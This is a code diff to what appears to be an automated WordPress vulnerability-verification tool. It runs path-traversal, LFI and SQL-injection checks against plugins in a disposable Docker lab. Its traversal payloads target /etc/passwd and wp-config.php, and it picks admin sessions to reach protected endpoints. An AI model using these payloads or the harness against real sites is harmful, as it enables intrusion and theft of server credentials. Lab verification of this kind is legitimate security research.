@@ -64,7 +64,13 @@ _ALPINE_IMAGE = "alpine:3.20"
 _ID_HINTS = ("user_id", "uid", "id", "target", "target_id", "user")
 _EMAIL_HINTS = ("email", "mail", "user_email")
 _PASS_HINTS = ("pass", "password", "pwd", "user_pass")
-_PATH_HINTS = ("file", "path", "page", "template", "include", "doc", "filename", "tpl", "view")
+_PATH_HINTS = (
+    "file", "path", "page", "template", "include", "doc", "filename", "tpl", "view",
+    # nombres adicionales comunes en plugins que usan LFI (source=Chartify, src, data, name, fname,
+    # filepath, dir, f, p, t -- cubre la mayoria de plugins RandomRobbieBF con LFI no-estandar)
+    "source", "src", "data", "name", "fname", "filepath", "dir", "f", "p", "t",
+    "load", "read", "fetch", "get", "open", "import", "url", "location",
+)
 # firma inequivoca de la primera linea de /etc/passwd en cualquier Linux (root, uid/gid 0) --
 # usada como fallback de path-traversal cuando el canario propio no se confirma (ver
 # verify_wordpress_path_traversal): a diferencia del canario (en /tmp, plantado por nosotros),
@@ -874,6 +880,16 @@ class _Lab:
                        "-v", f"{self.vol}:/var/www/html", *self._db_env, "--user", "33:33",
                        _WPCLI_IMAGE, "wp", "--path=/var/www/html", *args, timeout=timeout)
 
+    def exec_mysql(self, query: str, db_pw: str, timeout: float = 20.0) -> str:
+        """Ejecuta una query SQL directamente en el contenedor MySQL del lab via `docker exec`.
+        Devuelve el stdout (puede estar vacio si la query no produce filas). Util para sembrar
+        datos minimos de seed antes de intentar SQLi booleana en plugins que necesitan filas en
+        sus tablas personalizadas para devolver una respuesta con diferencial."""
+        r = self.sh("exec", self.mysql,
+                    "mysql", "-uwordpress", f"-p{db_pw}", "-D", "wordpress",
+                    "-e", query, timeout=timeout)
+        return (r.stdout or "") if r.returncode == 0 else ""
+
     def install_plugin(self, host_plugin_dir: str, slug: str, timeout=60.0) -> bool:
         """Copia el plugin (ya descargado a `host_plugin_dir`, que contiene <slug>/...) dentro del
         volumen compartido. NO usa un bind mount de `host_plugin_dir`: ese directorio lo creo YO
@@ -1491,6 +1507,7 @@ class _LabSession:
     directory_hash: Optional[str] = None      # Hash derivado del CPT post ID cuando el plugin
     # usa SUBSTRING(MD5(ID),N,L) como directory_id — confirmado via MySQL en _bootstrap_lab y
     # usado directamente en base_params sin fuerza bruta (que falla si nonce es incorrecto).
+    db_pw: str = ""                           # Password de MySQL del lab (para exec_mysql / seed data)
 
 
 def _bootstrap_lab(lab: "_Lab", plugin_source_dir: str, slug: str, step, res: WpVerifyResult,
@@ -1611,7 +1628,9 @@ def _bootstrap_lab(lab: "_Lab", plugin_source_dir: str, slug: str, step, res: Wp
                    f"--admin_user={admin_user}", f"--admin_password={admin_pass}",
                    "--admin_email=admin@binoracle-lab.invalid", "--skip-email", timeout=90)
     if r.returncode != 0:
-        res.detail = f"wp core install fallo: {(r.stderr or r.stdout or '')[:300]}"
+        _wp_install_err = (r.stderr or r.stdout or "")[:300]
+        res.detail = f"wp core install fallo: {_wp_install_err}"
+        step(f"[ERROR] wp core install fallo -- {_wp_install_err}")
         res.evidence["screenshots"] = shots
         return None
     # Bug real confirmado en vivo investigando CVE-2026-2991 (KiviCare): `wp core install` deja
@@ -1649,6 +1668,10 @@ def _bootstrap_lab(lab: "_Lab", plugin_source_dir: str, slug: str, step, res: Wp
     lab.wp_cli("config", "set", "WP_DEBUG_DISPLAY", "true" if wp_debug_display else "false",
               "--raw", "--type=constant", timeout=30)
     admin_id = lab.wp_cli("user", "get", admin_user, "--field=ID", timeout=30).stdout.strip()
+    if not admin_id:
+        # En un WordPress recién instalado el primer usuario siempre es id=1; usar como fallback.
+        admin_id = "1"
+        step("wp user get no devolvio el ID del admin -- usando id=1 (fallback para WP fresh install)")
     step(f"WordPress instalado; admin id={admin_id}")
     step("capturando pantalla: WordPress recien instalado y en pie (laboratorio en vivo)...")
     import requests as _requests
@@ -2155,7 +2178,7 @@ def _bootstrap_lab(lab: "_Lab", plugin_source_dir: str, slug: str, step, res: Wp
                        admin_pass=admin_pass, sub_user=sub_user, sub_pass=sub_pass,
                        sub_sess=sess, admin_sess=admin_sess, shots=shots, capture=capture,
                        shortcode_page_path=shortcode_page_path,
-                       directory_hash=_um_hashed)
+                       directory_hash=_um_hashed, db_pw=db_pw)
 
 
 def verify_wordpress_account_takeover(
@@ -2916,11 +2939,17 @@ def verify_wordpress_path_traversal(
 
     path_param = path_param_hint or _pick_param(parameters, _PATH_HINTS)
     if not path_param:
-        res.detail = "no se identifico el parametro que lleva la ruta/fichero objetivo"
-        res.limitations.append("la verificacion de path-traversal necesita saber que parametro "
-                               "lleva la ruta/nombre de fichero; afina 'parameters' en la "
-                               "hipotesis del LLM o pasalo a mano (path_param_hint)")
-        return res
+        # fallback: si hay parametros en la hipotesis, probar el primero -- cubre plugins LFI donde
+        # el nombre del param no esta en _PATH_HINTS (ej. sogrid, wp-umbrella, chartify/source)
+        _params_list = list(parameters.keys() if isinstance(parameters, dict) else (parameters or []))
+        if _params_list:
+            path_param = _params_list[0]
+        else:
+            res.detail = "no se identifico el parametro que lleva la ruta/fichero objetivo"
+            res.limitations.append("la verificacion de path-traversal necesita saber que parametro "
+                                   "lleva la ruta/nombre de fichero; afina 'parameters' en la "
+                                   "hipotesis del LLM o pasalo a mano (path_param_hint)")
+            return res
 
     lab = _Lab(_token())
     boot = None
@@ -2942,12 +2971,46 @@ def verify_wordpress_path_traversal(
 
         m = (http_method or "GET").upper()
         base_params = dict(parameters) if isinstance(parameters, dict) else dict.fromkeys(parameters or [], "")
+        # Normalizar endpoint: si el PoC incluye el param en la query string del propio endpoint
+        # (ej. '?tab=FILEHERE'), extraerlo para evitar doble '?tab=FILEHERE&tab=payload'.
+        # PHP usa el ultimo valor de un param duplicado, pero es mejor enviarlo una sola vez.
+        if "?" in (endpoint or ""):
+            from urllib.parse import urlparse, parse_qs
+            _ep_parsed = urlparse(endpoint)
+            _ep_qs_params = parse_qs(_ep_parsed.query, keep_blank_values=True)
+            # Separar params del endpoint: distinguir placeholders de valores reales.
+            # - Placeholder (FILEHERE, INJECT...): extraer como "" para que el verifier inyecte
+            # - Valor real (action=add, umbrella-restore=1, page=logs): extraer con su valor real
+            # - Valor con path traversal (../../etc/passwd): extraer como "" (el payload irá aquí)
+            _WORD_PLACEHOLDER_RE = re.compile(r'^[A-Z_]+(?:HERE|THERE|PAYLOAD|INJECT|PLACEHOLDER)$')
+            _TRAVERSAL_RE = re.compile(r'\.\.[\\/]|%2e%2e|%252e')
+            for _qk, _qv in _ep_qs_params.items():
+                _orig_v = _qv[0] if _qv else ""
+                _vl_up = _orig_v.upper()
+                _is_word_placeholder = (_WORD_PLACEHOLDER_RE.match(_vl_up) or
+                                        _vl_up in {"FILEHERE", "PAYLOAD", "INJECT", ""})
+                _is_traversal_payload = bool(_TRAVERSAL_RE.search(_orig_v))
+                if _qk not in base_params:
+                    if _is_word_placeholder or _is_traversal_payload:
+                        base_params[_qk] = ""  # slot para que el verifier inyecte
+                    else:
+                        base_params[_qk] = _orig_v  # valor real, preservar
+            endpoint = _ep_parsed.path
         # mismos bloqueos de infraestructura que SQLi (nonce/token sin resolver, ID ofuscado) --
         # ver _auto_resolve_wp_blockers: cualquier tecnica contra WordPress puede necesitarlo, no
         # solo SQLi.
         endpoint, base_params = _auto_resolve_wp_blockers(
             boot, lab, slug, m, endpoint, base_params, path_param, res, step,
             extra_nonce_pages=extra_nonce_pages)
+
+        # auto-seleccionar sesion correcta: endpoints bajo /wp-admin/ necesitan admin
+        _ep_lower_pt = (endpoint or "").lower()
+        _pt_needs_admin = ("/wp-admin/" in _ep_lower_pt or
+                           "admin-ajax.php" in _ep_lower_pt or
+                           _ep_lower_pt.startswith("wp-admin/"))
+        _pt_sess = boot.admin_sess if (_pt_needs_admin and boot.admin_sess) else boot.sub_sess
+        if _pt_needs_admin and boot.admin_sess:
+            step("endpoint bajo /wp-admin/ -- usando sesion de admin para path-traversal")
 
         res.evidence.update({
             "login_bajo_privilegio": boot.sub_user, "login_bajo_privilegio_password": boot.sub_pass,
@@ -2979,7 +3042,7 @@ def verify_wordpress_path_traversal(
             payload[path_param] = payload_value
             step(f"probando {m} {endpoint} con {path_param}={payload_value!r}...")
             try:
-                resp = boot.sub_sess.request(m, boot.base_url + endpoint,
+                resp = _pt_sess.request(m, boot.base_url + endpoint,
                                    data=payload if m != "GET" else None,
                                    params=payload if m == "GET" else None, timeout=20)
             except Exception as e:
@@ -3004,7 +3067,7 @@ def verify_wordpress_path_traversal(
             if secret not in (resp.text or ""):
                 for candidate in _extract_followable_urls(resp.text, boot.base_url):
                     try:
-                        candidate_resp = boot.sub_sess.request("GET", candidate, timeout=20)
+                        candidate_resp = _pt_sess.request("GET", candidate, timeout=20)
                     except Exception as e:
                         tried[-1].setdefault("followed_url_errors", []).append(
                             {"url": candidate, "error": str(e)})
@@ -3033,7 +3096,7 @@ def verify_wordpress_path_traversal(
                            + ("&" if "?" in endpoint else "?")
                            + f"{path_param}={payload_value}") if (m == "GET" and not follow_url) else None
                 if shot_url:
-                    boot.capture(boot.sub_sess, shot_url[len(boot.base_url):],
+                    boot.capture(_pt_sess, shot_url[len(boot.base_url):],
                            f"Paso 5: LECTURA DE FICHERO confirmada -- la respuesta real del "
                            f"servidor contiene el secreto plantado en {canary_path}, fuera del "
                            f"directorio web previsto.",
@@ -3062,7 +3125,7 @@ def verify_wordpress_path_traversal(
                 step(f"probando {m} {endpoint} con {path_param}={payload_value!r} "
                      f"(/etc/passwd)...")
                 try:
-                    resp = boot.sub_sess.request(m, boot.base_url + endpoint,
+                    resp = _pt_sess.request(m, boot.base_url + endpoint,
                                        data=payload if m != "GET" else None,
                                        params=payload if m == "GET" else None, timeout=20)
                 except Exception as e:
@@ -3166,11 +3229,17 @@ def verify_wordpress_lfi(
 
     path_param = path_param_hint or _pick_param(parameters, _PATH_HINTS)
     if not path_param:
-        res.detail = "no se identifico el parametro que lleva la ruta/fichero a incluir"
-        res.limitations.append(
-            "la verificacion de LFI necesita saber que parametro lleva la ruta; "
-            "afina 'parameters' en la hipotesis del LLM o pasalo a mano (path_param_hint)")
-        return res
+        # fallback: si hay parametros en la hipotesis, probar el primero -- cubre plugins LFI donde
+        # el nombre del param no esta en _PATH_HINTS (ej. sogrid, wp-umbrella, chartify/source)
+        _params_list = list(parameters.keys() if isinstance(parameters, dict) else (parameters or []))
+        if _params_list:
+            path_param = _params_list[0]
+        else:
+            res.detail = "no se identifico el parametro que lleva la ruta/fichero a incluir"
+            res.limitations.append(
+                "la verificacion de LFI necesita saber que parametro lleva la ruta; "
+                "afina 'parameters' en la hipotesis del LLM o pasalo a mano (path_param_hint)")
+            return res
 
     lab = _Lab(_token())
     boot = None
@@ -3182,6 +3251,33 @@ def verify_wordpress_lfi(
             return res
 
         m = (http_method or "GET").upper()
+        # Normalizar endpoint: extraer params del query string del propio endpoint
+        # (ej. sogrid: '?tab=FILEHERE') para evitar duplicados en la URL de ataque.
+        if "?" in (endpoint or ""):
+            from urllib.parse import urlparse, parse_qs
+            _ep_parsed = urlparse(endpoint)
+            _ep_qs_params = parse_qs(_ep_parsed.query, keep_blank_values=True)
+            _WORD_PLACEHOLDER_RE_LFI = re.compile(r'^[A-Z_]+(?:HERE|THERE|PAYLOAD|INJECT|PLACEHOLDER)$')
+            _TRAVERSAL_RE_LFI = re.compile(r'\.\.[\\/]|%2e%2e|%252e')
+            _parameters_list = list(parameters.keys() if isinstance(parameters, dict) else (parameters or []))
+            for _qk, _qv in _ep_qs_params.items():
+                _orig_v = _qv[0] if _qv else ""
+                _vl_up = _orig_v.upper()
+                _is_word_placeholder_lfi = (_WORD_PLACEHOLDER_RE_LFI.match(_vl_up) or
+                                             _vl_up in {"FILEHERE", "PAYLOAD", "INJECT", ""})
+                _is_traversal_payload_lfi = bool(_TRAVERSAL_RE_LFI.search(_orig_v))
+                if _qk not in _parameters_list:
+                    _inject_as_empty = _is_word_placeholder_lfi or _is_traversal_payload_lfi
+                    _new_val = "" if _inject_as_empty else _orig_v
+                    if isinstance(parameters, dict):
+                        parameters = dict(parameters)
+                        parameters[_qk] = _new_val
+                    else:
+                        _parameters_list.append(_qk)
+                        parameters = dict.fromkeys(_parameters_list, "")
+                        if not _inject_as_empty:
+                            parameters[_qk] = _orig_v
+            endpoint = _ep_parsed.path
 
         # ficheros objetivo: /etc/passwd (prueba clasica, siempre existe en Linux) y
         # wp-config.php (credenciales de BD, muy relevante en contexto WordPress).
@@ -3202,6 +3298,16 @@ def verify_wordpress_lfi(
             "....//....//....//etc/passwd",
         ]
 
+        # auto-seleccionar sesion correcta: endpoints bajo /wp-admin/ o admin-ajax.php
+        # requieren admin; el resto funciona con subscriber
+        _ep_lower_lfi = (endpoint or "").lower()
+        _lfi_needs_admin = ("/wp-admin/" in _ep_lower_lfi or
+                            "admin-ajax.php" in _ep_lower_lfi or
+                            _ep_lower_lfi.startswith("wp-admin/"))
+        _lfi_sess = boot.admin_sess if (_lfi_needs_admin and boot.admin_sess) else boot.sub_sess
+        if _lfi_needs_admin and boot.admin_sess:
+            step("endpoint bajo /wp-admin/ -- usando sesion de admin para LFI")
+
         res.evidence.update({
             "login_bajo_privilegio": boot.sub_user,
             "login_bajo_privilegio_password": boot.sub_pass,
@@ -3220,7 +3326,7 @@ def verify_wordpress_lfi(
                 payload[path_param] = payload_val
                 step(f"probando LFI de lectura: {path_param}={payload_val!r}...")
                 try:
-                    resp = boot.sub_sess.request(
+                    resp = _lfi_sess.request(
                         m, boot.base_url + endpoint, timeout=20,
                         data=payload if m != "GET" else None,
                         params=payload if m == "GET" else None)
@@ -3539,6 +3645,63 @@ def verify_wordpress_command_injection(
         return res
     finally:
         _finalize_lab(lab, boot, res, step, keep_lab_on_failure)
+
+
+def _detect_plugin_tables(plugin_source_dir: str) -> list:
+    """Escanea el codigo PHP del plugin buscando consultas SELECT/INSERT/UPDATE que referencian
+    tablas personalizadas (con prefijo $wpdb->prefix, 'wp_' literal, o {$wpdb->prefix}...).
+    Devuelve lista de nombres de tabla sin prefijo (p.ej. ['rooms', 'bookings', 'courses']),
+    deduplicados y ordenados por frecuencia de aparicion. Util para sembrar seed data antes de
+    verificar SQLi booleana en plugins que necesitan filas en esas tablas para producir diferencial."""
+    if not plugin_source_dir or not os.path.isdir(plugin_source_dir):
+        return []
+    table_counts: dict = {}
+    # patrones: `{$wpdb->prefix}tablename`, `$wpdb->prefix.'tablename'`, "'wp_tablename'"
+    _TABLE_RE = re.compile(
+        r'(?:\{\$wpdb->prefix\}|{?\$wpdb->prefix\.\'|\'wp_)([a-zA-Z][a-zA-Z0-9_]{1,40})(?:\')?',
+        re.IGNORECASE)
+    _SKIP_TABLES = {
+        "posts", "postmeta", "terms", "term_taxonomy", "term_relationships",
+        "options", "users", "usermeta", "comments", "commentmeta",
+        "links", "user_registrations", "blogs", "signups",
+    }
+    for root, _, files in os.walk(plugin_source_dir):
+        for fname in files:
+            if not fname.endswith(".php"):
+                continue
+            fpath = os.path.join(root, fname)
+            try:
+                with open(fpath, encoding="utf-8", errors="replace") as fh:
+                    content = fh.read(80_000)  # max 80KB por fichero
+            except Exception:
+                continue
+            for m in _TABLE_RE.finditer(content):
+                tbl = m.group(1).lower()
+                if tbl not in _SKIP_TABLES and len(tbl) > 2:
+                    table_counts[tbl] = table_counts.get(tbl, 0) + 1
+    return sorted(table_counts, key=lambda t: -table_counts[t])
+
+
+def _seed_plugin_tables(lab: "_Lab", db_pw: str, tables: list, step) -> int:
+    """Intenta sembrar una fila minima en cada tabla personalizada del plugin (hasta 3 tablas,
+    las mas frecuentes segun _detect_plugin_tables). Usa IGNORE para no fallar si la fila ya
+    existe o si la tabla no tiene las columnas esperadas. Devuelve el numero de tablas sembradas.
+    El objetivo es que el endpoint devuelva al menos una fila para que el diferencial booleano
+    sea detectable (TRUE=filas, FALSE=vacio) en plugins que fallan por DB vacia."""
+    seeded = 0
+    for tbl in tables[:3]:
+        full = f"wp_{tbl}"
+        # inserta una fila con solo la PK (id=1); el resto de columnas usan DEFAULT/NULL.
+        # Si falla (columna NOT NULL sin DEFAULT), no es un error critico.
+        q = f"INSERT IGNORE INTO {full} (id) VALUES (1);"
+        result = lab.exec_mysql(q, db_pw)
+        # Si la tabla tiene columna con otro nombre para la PK, prueba sin especificar columnas
+        if not result and "doesn't have a default" not in result:
+            q2 = f"INSERT IGNORE INTO {full} VALUES ();"
+            lab.exec_mysql(q2, db_pw)
+        step(f"seed data: intentado INSERT en {full} (para diferencial booleano en DB vacia)")
+        seeded += 1
+    return seeded
 
 
 def verify_wordpress_sqli(
@@ -4037,6 +4200,62 @@ def verify_wordpress_sqli(
                      f"'{sqli_param}' y ningun candidato lo corrigio -- continuando con la "
                      f"respuesta de error como baseline (el diferencial puede ser invalido)")
         base_len = len(base_resp.text or "")
+        # Si la respuesta de control indica falta de permisos, reintentar con admin_sess.
+        # Dos variantes:
+        #  a) WordPress admin-ajax devuelve "-1"/"0" cuando el action requiere privilegios
+        #  b) /wp-admin/* pages redirigen al subscriber a wp-login.php (302 o HTML con login form)
+        _ctrl_body_raw = (base_resp.text or "").strip()
+        _ep_lower_sqli = (endpoint or "").lower()
+        _is_admin_ep = "admin-ajax.php" in _ep_lower_sqli or "/wp-admin/" in _ep_lower_sqli
+        _login_redirect = (
+            base_resp.status_code in (301, 302, 303, 307, 308)
+            or ("wp-login.php" in (base_resp.text or "")
+                and "<html" in (base_resp.text or "").lower())
+        )
+        _needs_admin_retry = (
+            not _anon_attack and boot.admin_sess and _is_admin_ep and
+            (_ctrl_body_raw in ("-1", "0") or _login_redirect)
+        )
+        if _needs_admin_retry:
+            _reason = ("'-1'/'0'" if _ctrl_body_raw in ("-1", "0")
+                       else f"redirect ({base_resp.status_code}) / login page")
+            step(f"respuesta control es {_reason} -- el endpoint requiere admin; "
+                 f"reintentando con sesion de admin...")
+            _attack_sess = boot.admin_sess
+            try:
+                base_resp = send(orig_value)
+                base_len = len(base_resp.text or "")
+                _ctrl_body_raw = (base_resp.text or "").strip()
+                if _ctrl_body_raw in ("-1", "0") or (base_resp.status_code >= 300 and base_resp.status_code < 400):
+                    step("[WARN] respuesta sigue sin acceso con admin -- posiblemente "
+                         "accion invalida o endpoint bloqueado")
+                else:
+                    step(f"admin session funciona: respuesta control {base_len} bytes, "
+                         f"usando admin para todos los payloads")
+                    res.evidence["sqli_sesion_admin"] = True
+            except Exception:
+                pass
+        # Si la respuesta de control es vacia o muy pequeña (<= 10 bytes, tipicamente '[]', 'null',
+        # '{}', '0', ''), el endpoint probablemente necesita datos en la DB para producir diferencial.
+        # Intentar sembrar filas minimas en las tablas personalizadas del plugin, luego reintentar
+        # la peticion de control. Confirmado como causa raiz de CVE-2024-3605 (WP Hotel Booking),
+        # CVE-2025-22785 (Course Booking), CVE-2025-6970 (Events Manager), CVE-2024-9796 (WP Advanced Search).
+        _ctrl_body = (base_resp.text or "").strip()
+        if base_len <= 10 or _ctrl_body in ("[]", "null", "{}", "0", "false", ""):
+            step("respuesta control vacia/minima -- intentando seed data en tablas del plugin para "
+                 "producir diferencial booleano...")
+            _plugin_tables = _detect_plugin_tables(plugin_source_dir)
+            if _plugin_tables:
+                _seeded = _seed_plugin_tables(lab, boot.db_pw, _plugin_tables, step)
+                if _seeded:
+                    try:
+                        base_resp = send(orig_value)
+                        base_len = len(base_resp.text or "")
+                        _ctrl_body = (base_resp.text or "").strip()
+                        step(f"respuesta post-seed: {base_len} bytes -- "
+                             f"{'diferencial posible' if base_len > 10 else 'sigue vacia, continuando'}")
+                    except Exception:
+                        pass
         # recorte del cuerpo real de la peticion de CONTROL (sin inyeccion) -- confirmado en
         # vivo, CVE-2024-3552: un negativo sin esto no se puede diagnosticar sin relanzar el
         # ataque a mano; con el cuerpo real delante se ve al momento si el servidor esta
